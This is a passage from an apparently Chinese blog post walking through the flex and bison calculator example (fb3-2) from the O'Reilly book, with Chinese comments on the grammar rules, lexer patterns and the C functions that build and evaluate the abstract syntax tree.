$<span class="number">1</span>,$<span class="number">3</span>); &#125;</span><br><span class="line">   | <span class="built_in">exp</span> <span class="string">&#x27;-&#x27;</span> <span class="built_in">exp</span>          &#123; $$ = newast(<span class="string">&#x27;-&#x27;</span>, $<span class="number">1</span>,$<span class="number">3</span>);&#125;</span><br><span class="line">   | <span class="built_in">exp</span> <span class="string">&#x27;*&#x27;</span> <span class="built_in">exp</span>          &#123; $$ = newast(<span class="string">&#x27;*&#x27;</span>, $<span class="number">1</span>,$<span class="number">3</span>); &#125;</span><br><span class="line">   | <span class="built_in">exp</span> <span class="string">&#x27;/&#x27;</span> <span class="built_in">exp</span>          &#123; $$ = newast(<span class="string">&#x27;/&#x27;</span>, $<span class="number">1</span>,$<span class="number">3</span>); &#125;</span><br><span class="line">   | <span class="string">&#x27;|&#x27;</span> <span class="built_in">exp</span>              &#123; $$ = newast(<span class="string">&#x27;|&#x27;</span>, $<span class="number">2</span>, <span class="literal">NULL</span>); &#125;</span><br><span class="line">   | <span class="string">&#x27;(&#x27;</span> <span class="built_in">exp</span> <span class="string">&#x27;)&#x27;</span>          &#123; $$ = $<span class="number">2</span>; &#125;</span><br><span class="line">   | <span class="string">&#x27;-&#x27;</span> <span class="built_in">exp</span> %prec UMINUS &#123; $$ = newast(<span class="string">&#x27;M&#x27;</span>, $<span class="number">2</span>, <span class="literal">NULL</span>); &#125;</span><br><span class="line">   | NUMBER               &#123; $$ = newnum($<span class="number">1</span>); &#125;</span><br><span class="line">   | FUNC <span class="string">&#x27;(&#x27;</span> explist <span class="string">&#x27;)&#x27;</span> &#123; $$ = newfunc($<span class="number">1</span>, $<span class="number">3</span>); &#125;</span><br><span class="line">   | NAME                 &#123; $$ = newref($<span class="number">1</span>); &#125;</span><br><span class="line">   | NAME <span class="string">&#x27;=&#x27;</span> <span class="built_in">exp</span>         &#123; $$ = newasgn($<span class="number">1</span>, $<span class="number">3</span>); &#125;</span><br><span class="line">   | NAME <span class="string">&#x27;(&#x27;</span> explist <span class="string">&#x27;)&#x27;</span> &#123; $$ = newcall($<span class="number">1</span>, $<span class="number">3</span>); &#125;</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="comment">//表达式列表</span></span><br><span class="line">explist: <span class="built_in">exp</span></span><br><span class="line"> | <span class="built_in">exp</span> <span class="string">&#x27;,&#x27;</span> explist  &#123; $$ = newast(<span class="string">&#x27;L&#x27;</span>, $<span class="number">1</span>, $<span class="number">3</span>); &#125;</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"><span class="comment">//符号列表，用于函数调用，右递归的</span></span><br><span class="line">symlist: NAME       &#123; $$ = newsymlist($<span class="number">1</span>, <span class="literal">NULL</span>); &#125;</span><br><span class="line"> | NAME <span class="string">&#x27;,&#x27;</span> symlist &#123; $$ = newsymlist($<span class="number">1</span>, $<span class="number">3</span>); &#125;</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//计算器的顶层规则</span></span><br><span class="line"></span><br><span class="line">calclist: <span class="comment">/* nothing */</span></span><br><span class="line">  | calclist stmt EOL &#123;</span><br><span class="line">    <span class="keyword">if</span>(debug) dumpast($<span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;= %4.4g\n&gt; &quot;</span>, eval($<span class="number">2</span>));</span><br><span class="line">     treefree($<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//识别一个函数声明 let xxx() = xxx 这样的</span></span><br><span class="line">  | calclist LET NAME <span class="string">&#x27;(&#x27;</span> symlist <span class="string">&#x27;)&#x27;</span> <span class="string">&#x27;=&#x27;</span> <span class="built_in">list</span> EOL &#123;</span><br><span class="line">                       dodef($<span class="number">3</span>, $<span class="number">5</span>, $<span class="number">8</span>);</span><br><span class="line">                       <span class="built_in">printf</span>(<span class="string">&quot;Defined %s\n&gt; &quot;</span>, $<span class="number">3</span>-&gt;name); &#125;</span><br><span class="line"></span><br><span class="line">  | calclist error EOL &#123; yyerrok; <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>); &#125;</span><br><span class="line"> ;</span><br><span class="line">%%</span><br></pre></td></tr></table></figure>

<h5 id="词法分析部分："><a href="#词法分析部分：" class="headerlink" title="词法分析部分："></a>词法分析部分：</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ cat fb3<span class="number">-2.l</span></span><br><span class="line"><span class="comment">/* Companion source code for &quot;flex &amp; bison&quot;, published by O&#x27;Reilly</span></span><br><span class="line"><span class="comment"> * Media, ISBN 978-0-596-15597-1</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2009, Taughannock Networks. All rights reserved.</span></span><br><span class="line"><span class="comment"> * See the README file for license conditions and contact info.</span></span><br><span class="line"><span class="comment"> * $Header: /home/johnl/flnb/code/RCS/fb3-2.l,v 2.1 2009/11/08 02:53:18 johnl Exp $</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* recognize tokens for the calculator */</span></span><br><span class="line"></span><br><span class="line">%option noyywrap nodefault yylineno</span><br><span class="line">%&#123;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&quot;fb3-2.h&quot;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&quot;fb3-2.tab.h&quot;</span></span></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* float exponent */</span> 浮点数，e开头，正负，这是指数部分</span><br><span class="line">EXP    ([Ee][-+]?[<span class="number">0</span><span class="number">-9</span>]+)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//操作符单操作数</span></span><br><span class="line">%%</span><br><span class="line"> <span class="comment">/* single character ops */</span></span><br><span class="line"><span class="string">&quot;+&quot;</span> |</span><br><span class="line"><span class="string">&quot;-&quot;</span> |</span><br><span class="line"><span class="string">&quot;*&quot;</span> |</span><br><span class="line"><span class="string">&quot;/&quot;</span> |</span><br><span class="line"><span class="string">&quot;=&quot;</span> |</span><br><span class="line"><span class="string">&quot;|&quot;</span> |</span><br><span class="line"><span class="string">&quot;,&quot;</span> |</span><br><span class="line"><span class="string">&quot;;&quot;</span> |</span><br><span class="line"><span class="string">&quot;(&quot;</span> |</span><br><span class="line"><span class="string">&quot;)&quot;</span>     &#123; <span class="keyword">return</span> yytext[<span class="number">0</span>]; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//双操作数操作符</span></span><br><span class="line"> <span class="comment">/* comparison ops */</span></span><br><span class="line"><span class="string">&quot;&gt;&quot;</span>     &#123; yylval.fn = <span class="number">1</span>; <span class="keyword">return</span> CMP; &#125;</span><br><span class="line"><span class="string">&quot;&lt;&quot;</span>     &#123; yylval.fn = <span class="number">2</span>; <span class="keyword">return</span> CMP; &#125;</span><br><span class="line"><span class="string">&quot;&lt;&gt;&quot;</span>    &#123; yylval.fn = <span class="number">3</span>; <span class="keyword">return</span> CMP; &#125;</span><br><span class="line"><span class="string">&quot;==&quot;</span>    &#123; yylval.fn = <span class="number">4</span>; <span class="keyword">return</span> CMP; &#125;</span><br><span class="line"><span class="string">&quot;&gt;=&quot;</span>    &#123; yylval.fn = <span class="number">5</span>; <span class="keyword">return</span> CMP; &#125;</span><br><span class="line"><span class="string">&quot;&lt;=&quot;</span>    &#123; yylval.fn = <span class="number">6</span>; <span class="keyword">return</span> CMP; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//关键字</span></span><br><span class="line"> <span class="comment">/* keywords */</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;if&quot;</span>    &#123; <span class="keyword">return</span> IF; &#125;</span><br><span class="line"><span class="string">&quot;then&quot;</span>  &#123; <span class="keyword">return</span> THEN; &#125;</span><br><span class="line"><span class="string">&quot;else&quot;</span>  &#123; <span class="keyword">return</span> ELSE; &#125;</span><br><span class="line"><span class="string">&quot;while&quot;</span> &#123; <span class="keyword">return</span> WHILE; &#125;</span><br><span class="line"><span class="string">&quot;do&quot;</span>    &#123; <span class="keyword">return</span> DO; &#125;</span><br><span class="line"><span class="string">&quot;let&quot;</span>   &#123; <span class="keyword">return</span> LET;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//内建的一些函数</span></span><br><span class="line"> <span class="comment">/* built in functions */</span></span><br><span class="line"><span class="string">&quot;sqrt&quot;</span>  &#123; yylval.fn = B_sqrt; <span class="keyword">return</span> FUNC; &#125;</span><br><span class="line"><span class="string">&quot;exp&quot;</span>   &#123; yylval.fn = B_exp; <span class="keyword">return</span> FUNC; &#125;</span><br><span class="line"><span class="string">&quot;log&quot;</span>   &#123; yylval.fn = B_log; <span class="keyword">return</span> FUNC; &#125;</span><br><span class="line"><span class="string">&quot;print&quot;</span> &#123; yylval.fn = B_print; <span class="keyword">return</span> FUNC; &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* debug hack */</span></span><br><span class="line"><span class="string">&quot;debug&quot;</span>[<span class="number">0</span><span class="number">-9</span>]+ &#123; debug = atoi(&amp;yytext[<span class="number">5</span>]); <span class="built_in">printf</span>(<span class="string">&quot;debug set to %d\n&quot;</span>, debug); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明的函数的函数名，字母开头</span></span><br><span class="line"> <span class="comment">/* names */</span></span><br><span class="line">[a-zA-Z][a-zA-Z0<span class="number">-9</span>]*  &#123; yylval.s = lookup(yytext); <span class="keyword">return</span> NAME; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//浮点数</span></span><br><span class="line">[<span class="number">0</span><span class="number">-9</span>]+<span class="string">&quot;.&quot;</span>[<span class="number">0</span><span class="number">-9</span>]*&#123;EXP&#125;? |</span><br><span class="line"><span class="string">&quot;.&quot;</span>?[<span class="number">0</span><span class="number">-9</span>]+&#123;EXP&#125;? &#123; yylval.d = atof(yytext); <span class="keyword">return</span> NUMBER; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//其他的符号</span></span><br><span class="line"><span class="string">&quot;//&quot;</span>.*</span><br><span class="line">[ \t]   <span class="comment">/* ignore white space */</span></span><br><span class="line">\\\<span class="function">n    <span class="title">printf</span><span class="params">(<span class="string">&quot;c&gt; &quot;</span>)</span></span>; <span class="comment">/* ignore line continuation */</span></span><br><span class="line"><span class="string">&quot;\n&quot;</span>    &#123; <span class="keyword">return</span> EOL; &#125;</span><br><span class="line"></span><br><span class="line">.    &#123; yyerror(<span class="string">&quot;Mystery character %c\n&quot;</span>, *yytext); &#125;</span><br><span class="line">%%</span><br></pre></td></tr></table></figure>

<h5 id="函数实现，构造ast什么的："><a href="#函数实现，构造ast什么的：" class="headerlink" title="函数实现，构造ast什么的："></a>函数实现，构造ast什么的：</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">$ cat fb3<span class="number">-2f</span>uncs.c</span><br><span class="line"><span class="comment">/* Companion source code for &quot;flex &amp; bison&quot;, published by O&#x27;Reilly</span></span><br><span class="line"><span class="comment"> * Media, ISBN 978-0-596-15597-1</span></span><br><span class="line"><span class="comment"> * Copyright (c) 2009, Taughannock Networks. All rights reserved.</span></span><br><span class="line"><span class="comment"> * See the README file for license conditions and contact info.</span></span><br><span class="line"><span class="comment"> * $Header: /home/johnl/flnb/code/RCS/fb3-2funcs.c,v 2.1 2009/11/08 02:53:18 johnl Exp $</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * helper functions for fb3-2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&quot;fb3-2.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//这些是辅助函数：构造符号表、hash算法、查找</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* symbol table */</span></span><br><span class="line"><span class="comment">/* hash a symbol */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span></span><br><span class="line">symhash(<span class="keyword">char</span> *sym)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> hash = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> c;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(c = *sym++) hash = hash*<span class="number">9</span> ^ c;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> hash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">symbol</span> *</span></span><br><span class="line"><span class="class"><span class="title">lookup</span>(<span class="title">char</span>* <span class="title">sym</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">symbol</span> *<span class="title">sp</span> =</span> &amp;symtab[symhash(sym)%NHASH];</span><br><span class="line">  <span class="keyword">int</span> scount = NHASH;        <span class="comment">/* how many have we looked at */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(--scount &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(sp-&gt;name &amp;&amp; !<span class="built_in">strcmp</span>(sp-&gt;name, sym)) &#123; <span class="keyword">return</span> sp; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!sp-&gt;name) &#123;        <span class="comment">/* new entry */</span></span><br><span class="line">      sp-&gt;name = strdup(sym);</span><br><span class="line">      sp-&gt;value = <span class="number">0</span>;</span><br><span class="line">      sp-&gt;func = <span class="literal">NULL</span>;</span><br><span class="line">      sp-&gt;syms = <span class="literal">NULL</span>;</span><br><span class="line">      <span class="keyword">return</span> sp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(++sp &gt;= symtab+NHASH) sp = symtab; <span class="comment">/* try the next entry */</span></span><br><span class="line">  &#125;</span><br><span class="line">  yyerror(<span class="string">&quot;symbol table overflow\n&quot;</span>);</span><br><span class="line">  <span class="built_in">abort</span>(); <span class="comment">/* tried them all, table is full */</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//这是构造ast的函数，根据参数，填充ast的结构。</span></span><br><span class="line"><span class="comment">//填充 type，节点什么的</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ast</span> *</span></span><br><span class="line"><span class="class"><span class="title">newast</span>(<span class="title">int</span> <span class="title">nodetype</span>, <span class="keyword">struct</span> <span class="title">ast</span> *<span class="title">l</span>, <span class="keyword">struct</span> <span class="title">ast</span> *<span class="title">r</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ast</span> *<span class="title">a</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct ast));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">&quot;out of space&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = nodetype;</span><br><span class="line">  a-&gt;l = l;</span><br><span class="line">  a-&gt;r = r;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//number的ast</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ast</span> *</span></span><br><span class="line"><span class="class"><span class="title">newnum</span>(<span class="title">double</span> <span class="title">d</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">numval</span> *<span class="title">a</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct numval));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">&quot;out of space&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = <span class="string">&#x27;K&#x27;</span>;</span><br><span class="line">  a-&gt;number = d;</span><br><span class="line">  <span class="keyword">return</span> (struct ast *)a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//比较表达式的ast</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ast</span> *</span></span><br><span class="line"><span class="class"><span class="title">newcmp</span>(<span class="title">int</span> <span class="title">cmptype</span>, <span class="keyword">struct</span> <span class="title">ast</span> *<span class="title">l</span>, <span class="keyword">struct</span> <span class="title">ast</span> *<span class="title">r</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ast</span> *<span class="title">a</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct ast));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">&quot;out of space&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = <span class="string">&#x27;0&#x27;</span> + cmptype;</span><br><span class="line">  a-&gt;l = l;</span><br><span class="line">  a-&gt;r = r;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数的ast</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ast</span> *</span></span><br><span class="line"><span class="class"><span class="title">newfunc</span>(<span class="title">int</span> <span class="title">functype</span>, <span class="keyword">struct</span> <span class="title">ast</span> *<span class="title">l</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">fncall</span> *<span class="title">a</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct fncall));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">&quot;out of space&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = <span class="string">&#x27;F&#x27;</span>;</span><br><span class="line">  a-&gt;l = l;</span><br><span class="line">  a-&gt;functype = functype;</span><br><span class="line">  <span class="keyword">return</span> (struct ast *)a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用的ast</span></span><br><span class="line"><span class="comment">// call funcname();这种</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ast</span> *</span></span><br><span class="line"><span class="class"><span class="title">newcall</span>(<span class="keyword">struct</span> <span class="title">symbol</span> *<span class="title">s</span>, <span class="keyword">struct</span> <span class="title">ast</span> *<span class="title">l</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ufncall</span> *<span class="title">a</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct ufncall));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">&quot;out of space&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = <span class="string">&#x27;C&#x27;</span>;</span><br><span class="line">  a-&gt;l = l;</span><br><span class="line">  a-&gt;s = s;</span><br><span class="line">  <span class="keyword">return</span> (struct ast *)a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//引用的ast</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ast</span> *</span></span><br><span class="line"><span class="class"><span class="title">newref</span>(<span class="keyword">struct</span> <span class="title">symbol</span> *<span class="title">s</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">symref</span> *<span class="title">a</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct symref));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">&quot;out of space&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = <span class="string">&#x27;N&#x27;</span>;</span><br><span class="line">  a-&gt;s = s;</span><br><span class="line">  <span class="keyword">return</span> (struct ast *)a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//赋值表达式 ast</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ast</span> *</span></span><br><span class="line"><span class="class"><span class="title">newasgn</span>(<span class="keyword">struct</span> <span class="title">symbol</span> *<span class="title">s</span>, <span class="keyword">struct</span> <span class="title">ast</span> *<span class="title">v</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">symasgn</span> *<span class="title">a</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct symasgn));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">&quot;out of space&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">  a-&gt;s = s;</span><br><span class="line">  a-&gt;v = v;</span><br><span class="line">  <span class="keyword">return</span> (struct ast *)a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//条件表达式的ast</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ast</span> *</span></span><br><span class="line"><span class="class"><span class="title">newflow</span>(<span class="title">int</span> <span class="title">nodetype</span>, <span class="keyword">struct</span> <span class="title">ast</span> *<span class="title">cond</span>, <span class="keyword">struct</span> <span class="title">ast</span> *<span class="title">tl</span>, <span class="keyword">struct</span> <span class="title">ast</span> *<span class="title">el</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">flow</span> *<span class="title">a</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct flow));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">&quot;out of space&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a-&gt;nodetype = nodetype;</span><br><span class="line">  a-&gt;cond = cond;</span><br><span class="line">  a-&gt;tl = tl;</span><br><span class="line">  a-&gt;el = el;</span><br><span class="line">  <span class="keyword">return</span> (struct ast *)a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//符号list</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">symlist</span> *</span></span><br><span class="line"><span class="class"><span class="title">newsymlist</span>(<span class="keyword">struct</span> <span class="title">symbol</span> *<span class="title">sym</span>, <span class="keyword">struct</span> <span class="title">symlist</span> *<span class="title">next</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">symlist</span> *<span class="title">sl</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct symlist));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!sl) &#123;</span><br><span class="line">    yyerror(<span class="string">&quot;out of space&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sl-&gt;sym = sym;</span><br><span class="line">  sl-&gt;next = next;</span><br><span class="line">  <span class="keyword">return</span> sl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//释放符号list</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">symlistfree(struct symlist *sl)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">symlist</span> *<span class="title">nsl</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(sl) &#123;</span><br><span class="line">    nsl = sl-&gt;next;</span><br><span class="line">    <span class="built_in">free</span>(sl);</span><br><span class="line">    sl = nsl;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//定义一个函数</span></span><br><span class="line"><span class="comment">//func(parma1,parma2…);</span></span><br><span class="line"><span class="comment">/* define a function */</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">dodef(struct symbol *name, struct symlist *syms, struct ast *func)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span>(name-&gt;syms) symlistfree(name-&gt;syms);</span><br><span class="line">  <span class="keyword">if</span>(name-&gt;func) treefree(name-&gt;func);</span><br><span class="line">  name-&gt;syms = syms;</span><br><span class="line">  name-&gt;func = func;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">double</span> <span class="title">callbuiltin</span><span class="params">(struct fncall *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">double</span> <span class="title">calluser</span><span class="params">(struct ufncall *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ast求值</span></span><br><span class="line"><span class="keyword">double</span></span><br><span class="line">eval(struct ast *a)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">double</span> v;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!a) &#123;</span><br><span class="line">    yyerror(<span class="string">&quot;internal error, null eval&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0.0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">switch</span>(a-&gt;nodetype) &#123;</span><br><span class="line">    <span class="comment">/* constant */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;K&#x27;</span>: v = ((struct numval *)a)-&gt;number; <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* name reference */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;N&#x27;</span>: v = ((struct symref *)a)-&gt;s-&gt;value; <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* assignment */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;=&#x27;</span>: v = ((struct symasgn *)a)-&gt;s-&gt;value =</span><br><span class="line">      eval(((struct symasgn *)a)-&gt;v); <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* expressions */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>: v = eval(a-&gt;l) + eval(a-&gt;r); <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>: v = eval(a-&gt;l) - eval(a-&gt;r); <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>: v = eval(a-&gt;l) * eval(a-&gt;r); <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>: v = eval(a-&gt;l) / eval(a-&gt;r); <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;|&#x27;</span>: v = <span class="built_in">fabs</span>(eval(a-&gt;l)); <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>: v = -eval(a-&gt;l); <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* comparisons */</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>: v = (eval(a-&gt;l) &gt; eval(a-&gt;r))? <span class="number">1</span> : <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>: v = (eval(a-&gt;l) &lt; eval(a-&gt;r))? <span class="number">1</span> : <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>: v = (eval(a-&gt;l) != eval(a-&gt;r))? <span class="number">1</span> : <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>: v = (eval(a-&gt;l) == eval(a-&gt;r))? <span class="number">1</span> : <span class="number">0</span>; <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>: v = (eval(a-&gt;l) &gt;= eval(a-&gt;r))? <span class="number">1</span> : <span 